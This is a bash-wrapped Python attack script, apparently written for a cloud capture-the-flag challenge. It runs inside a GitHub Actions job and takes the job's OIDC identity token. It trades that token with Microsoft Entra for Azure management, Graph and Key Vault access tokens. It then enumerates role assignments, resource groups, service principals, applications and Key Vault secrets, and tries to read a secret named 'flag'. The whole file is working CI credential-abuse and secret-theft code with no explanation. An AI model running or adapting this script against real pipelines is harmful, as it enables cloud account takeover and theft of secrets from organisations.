#!/usr/bin/env bash
set +e
exec python3 - <<'PY'
import os, json, urllib.request, urllib.parse, urllib.error, base64

def ex(u, data=None, headers=None, method=None):
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, data=data, headers=headers or {}, method=method), timeout=30)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, repr(e)[:300]

def jdecode(t):
    try:
        p = t.split(".")[1]; p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception as e:
        return {"err": repr(e)}

TEN = os.environ.get("AZURE_TENANT_ID", "")
CID = os.environ.get("AZURE_CLIENT_ID", "")
SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", "")
print("===Q_START===")

u = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api%3A%2F%2FAzureADTokenExchange"
s, b = ex(u, headers={"Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
oidc = json.loads(b).get("value", "")
print("OIDC_LEN", len(oidc))
print("OIDC_CLAIMS", json.dumps({k: jdecode(oidc).get(k) for k in ("iss", "sub", "aud", "actor", "job_workflow_ref", "repository")}))

def aad(cid, scope, secret=None, assertion=None):
    d = {"grant_type": "client_credentials", "client_id": cid, "scope": scope}
    if assertion:
        d["client_assertion_type"] = "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
        d["client_assertion"] = assertion
    if secret:
        d["client_secret"] = secret
    s, b = ex("https://login.microsoftonline.com/%s/oauth2/v2.0/token" % TEN,
              data=urllib.parse.urlencode(d).encode(),
              headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        return json.loads(b).get("access_token", "")
    except Exception:
        print("AAD_ERR", cid[:8], scope, s, b[:200]); return ""

ARM = aad(CID, "https://management.azure.com/.default", assertion=oidc)
GRAPH = aad(CID, "https://graph.microsoft.com/.default", assertion=oidc)
VAULT = aad(CID, "https://vault.azure.net/.default", assertion=oidc)
print("CI_TOKENS arm=%d graph=%d vault=%d" % (len(ARM), len(GRAPH), len(VAULT)))

def q(u, tok, m="GET"):
    h = {"Authorization": "Bearer " + tok}
    if m == "POST":
        h["Content-Length"] = "0"
    return ex(u, data=b"" if m == "POST" else None, headers=h, method=m)

FLAG = "/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets/flag" % SUB
s, b = q("https://management.azure.com%s/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" % FLAG, ARM)
print("FLAG_RA", s, b[:6000])

s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets?api-version=2023-07-01" % SUB, ARM)
print("SEC_SECRETS", s, b[:3000])

s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups?api-version=2022-09-01" % SUB, ARM)
print("RGS", s, [g.get("name") for g in json.loads(b).get("value", [])] if s == 200 else b[:300])

s, b = q("https://graph.microsoft.com/v1.0/servicePrincipals?$select=id,appId,displayName&$top=200", GRAPH)
if s == 200:
    for sp in json.loads(b).get("value", []):
        print("SP", sp.get("displayName"), sp.get("appId"), sp.get("id"))
else:
    print("SPS_ERR", s, b[:300])

s, b = q("https://graph.microsoft.com/v1.0/applications?$select=id,appId,displayName&$top=200", GRAPH)
if s == 200:
    for sp in json.loads(b).get("value", []):
        print("APP", sp.get("displayName"), sp.get("appId"), sp.get("id"))
else:
    print("APPS_ERR", s, b[:300])

s, b = ex("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4", headers={"Authorization": "Bearer " + VAULT})
print("CI_FLAG_TRY", s, b[:300])
print("===Q_END===")
PY
